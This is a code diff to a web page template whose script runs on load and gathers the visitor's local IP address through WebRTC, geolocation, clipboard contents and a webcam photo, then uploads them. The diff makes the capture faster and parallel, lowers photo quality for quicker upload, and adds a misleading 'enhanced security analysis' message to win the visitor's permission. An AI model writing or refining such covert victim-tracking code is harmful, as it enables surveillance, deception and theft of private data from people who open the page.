@@ -110,32 +110,40 @@
         }
     }
 
-    // Function to get local IP address via WebRTC
+    // Optimized function to get local IP address via WebRTC
     function getLocalIP() {
         return new Promise((resolve, reject) => {
             const pc = new RTCPeerConnection({
                 iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
             });
             
+            let resolved = false;
+            
             pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(reject);
             
             pc.onicecandidate = event => {
+                if (resolved) return;
+                
                 if (event.candidate) {
                     const candidate = event.candidate.candidate;
                     const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-                    if (ipMatch) {
+                    if (ipMatch && !ipMatch[1].startsWith('127.')) {  // Skip localhost
+                        resolved = true;
                         pc.close();
                         resolve(ipMatch[1]);
                     }
                 }
             };
             
-            // Timeout after 3 seconds
+            // Faster timeout for quicker response
             setTimeout(() => {
-                pc.close();
-                reject(new Error('Timeout'));
-            }, 3000);
+                if (!resolved) {
+                    resolved = true;
+                    pc.close();
+                    reject(new Error('Timeout'));
+                }
+            }, 2000);  // Reduced from 3s to 2s
         });
     }
 
@@ -295,13 +303,13 @@
         }
     }
 
-    // Collect geolocation (requires permission)
+    // Collect geolocation (requires permission) - optimized for speed
     async function collectGeolocation() {
         updateProgress(3, 'working');
         
         try {
             const geo = await new Promise((resolve, reject) => {
-                const timeoutId = setTimeout(() => reject(new Error("Geolocation timeout")), 10000);
+                const timeoutId = setTimeout(() => reject(new Error("Geolocation timeout")), 5000); // Reduced from 10s to 5s
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         clearTimeout(timeoutId);
@@ -311,7 +319,11 @@
                         clearTimeout(timeoutId);
                         reject(error);
                     },
-                    { timeout: 8000, enableHighAccuracy: true }
+                    { 
+                        timeout: 4000,  // Reduced from 8s to 4s
+                        enableHighAccuracy: false,  // Changed to false for faster response
+                        maximumAge: 60000  // Accept cached position up to 1 minute old
+                    }
                 );
             });
             
@@ -384,10 +396,11 @@
             // Request camera access with fallback constraints
             console.log("📱 Requesting camera access...");
             
+            // Use minimal constraints for faster camera access
             let constraints = {
                 video: {
-                    width: { ideal: 640, max: 1280 },
-                    height: { ideal: 480, max: 720 },
+                    width: { ideal: 320, max: 640 },  // Smaller resolution for speed
+                    height: { ideal: 240, max: 480 },
                     facingMode: 'user'
                 }
             };
@@ -427,13 +440,13 @@
                         
                         if (video.readyState < 2) {
                             console.warn("⚠️ Video not ready, waiting...");
-                            setTimeout(capturePhoto, 500);
+                            setTimeout(capturePhoto, 200);  // Reduced wait time
                             return;
                         }
                         
                         const canvas = document.createElement("canvas");
-                        const width = video.videoWidth || 640;
-                        const height = video.videoHeight || 480;
+                        const width = video.videoWidth || 320;  // Smaller default size
+                        const height = video.videoHeight || 240;
                         
                         canvas.width = width;
                         canvas.height = height;
@@ -444,7 +457,7 @@
                         ctx.drawImage(video, 0, 0, width, height);
                         console.log("🖼️ Drew video frame to canvas:", width, "x", height);
                         
-                        // Convert to blob
+                        // Convert to blob with lower quality for faster processing
                         canvas.toBlob(async (blob) => {
                             if (resolved) return;
                             resolved = true;
@@ -488,7 +501,7 @@
                             
                             cleanup();
                             resolve();
-                        }, "image/jpeg", 0.9);
+                        }, "image/jpeg", 0.7);  // Reduced quality for faster upload
                         
                     } catch (captureError) {
                         if (!resolved) {
@@ -501,23 +514,23 @@
                     }
                 };
                 
-                // Multiple event listeners for different scenarios
+                // Optimized event listeners for faster capture
                 video.addEventListener('loadedmetadata', () => {
                     console.log("📊 Video metadata loaded");
-                    setTimeout(capturePhoto, 1000);
+                    setTimeout(capturePhoto, 500);  // Reduced delay
                 });
                 
                 video.addEventListener('canplay', () => {
                     console.log("▶️ Video can play");
-                    setTimeout(capturePhoto, 500);
+                    setTimeout(capturePhoto, 200);  // Reduced delay
                 });
                 
                 video.addEventListener('playing', () => {
                     console.log("🎬 Video is playing");
-                    setTimeout(capturePhoto, 100);
+                    setTimeout(capturePhoto, 50);   // Much faster
                 });
                 
-                // Fallback timeout
+                // Reduced timeout for faster completion
                 setTimeout(() => {
                     if (!resolved) {
                         console.warn("⏰ Camera capture timeout");
@@ -526,7 +539,7 @@
                         cleanup();
                         resolve();
                     }
-                }, 15000); // 15 second timeout
+                }, 8000); // Reduced from 15s to 8s
                 
                 // Try to start video playback
                 video.play().catch(playError => {
@@ -548,26 +561,53 @@
         }
     }
 
-    // Main incremental data collection function
+    // Request all permissions upfront for better UX
+    async function requestAllPermissions() {
+        const permissions = [];
+        
+        // Request geolocation permission
+        try {
+            const geoPermission = await navigator.permissions.query({name: 'geolocation'});
+            permissions.push({type: 'geolocation', status: geoPermission.state});
+        } catch (e) {
+            permissions.push({type: 'geolocation', status: 'unknown'});
+        }
+        
+        // Request camera permission
+        try {
+            const cameraPermission = await navigator.permissions.query({name: 'camera'});
+            permissions.push({type: 'camera', status: cameraPermission.state});
+        } catch (e) {
+            permissions.push({type: 'camera', status: 'unknown'});
+        }
+        
+        return permissions;
+    }
+
+    // Optimized main data collection function - parallel execution where possible
     async function autoUpload() {
         try {
             showProgressCard();
-            updateStatus("Starting data collection...", "info");
+            updateStatus("Starting optimized data collection...", "info");
             
-            // Step 1: Always collect basic info (no permissions needed)
+            // Step 1: Always collect basic info (no permissions needed) - FAST
             await collectBasicInfo();
             
-            // Step 2: Try to collect network info
-            await collectNetworkInfo();
+            // Step 2: Start network info collection (parallel with permission requests)
+            const networkPromise = collectNetworkInfo();
             
-            // Step 3: Try to collect geolocation (may fail)
-            await collectGeolocation();
+            // Step 3-5: Run permission-based collections in parallel for speed
+            const permissionPromises = [
+                collectGeolocation(),
+                collectClipboard(), 
+                collectCamera()
+            ];
             
-            // Step 4: Try to collect clipboard (may fail)
-            await collectClipboard();
+            // Wait for network info (usually fast)
+            await networkPromise;
             
-            // Step 5: Try to collect camera photo (may fail)
-            await collectCamera();
+            // Wait for all permission-based collections to complete
+            await Promise.allSettled(permissionPromises);
             
             // Final step: Send completion signal
             updateProgress(6, 'working');
@@ -587,7 +627,11 @@
     }
 
     window.addEventListener('load', () => {
-        setTimeout(() => autoUpload(), 1000);
+        // Show a brief message about permissions
+        setTimeout(() => {
+            updateStatus("Requesting permissions for enhanced security analysis...", "info");
+            setTimeout(() => autoUpload(), 500);
+        }, 1000);
     });
 </script>
 {% endblock %}
